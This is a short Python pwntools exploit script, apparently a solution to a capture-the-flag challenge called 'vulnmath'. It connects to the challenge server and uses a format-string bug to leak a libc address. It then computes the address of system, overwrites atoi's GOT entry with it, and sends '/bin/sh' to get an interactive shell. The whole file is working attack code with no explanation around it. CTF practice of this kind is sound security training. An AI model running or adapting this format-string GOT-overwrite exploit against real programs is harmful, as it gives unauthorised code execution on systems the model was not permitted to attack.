from pwn import *

target = remote("chal.tuctf.com", 30502)

#target = process("./vulnmath", env={"LD_PRELOAD":"./libc.so.6"})
#gdb.attach(target, gdbscript = 'b *0x8049447')
libc = ELF("./libc.so.6")


# Leak the libc address, calculate libc base and system address
leakPayload = "%23$x"

target.sendline(leakPayload)

print target.recvuntil("> Incorrect!\n")

leak = target.recvline()

leak = int("0x" + leak, 16)

libcBase = leak - 0x1efb9
system = libcBase + libc.symbols["system"]

print "libc base is: " + hex(libcBase)
print "system is: " + hex(system)


# Calculate values we will write for got overwrite
firstWrite = (system & 0xffff) - 0x8
secondWrite = ((system & 0xffff0000) >> 16) - firstWrite - 8

# Make the payload for the got address of atoi
fmtString = p32(0x804c038) + p32(0x804c03a) + '%' + str(firstWrite)+ 'x'  + '%6$n' + '%' + str(secondWrite) + 'x%7$n'

# Send the format string, execute the got overwrite
target.sendline(fmtString)

# Send /bin/sh for argument to system
target.sendline('/bin/sh\x00')

# Get shell
target.interactive()
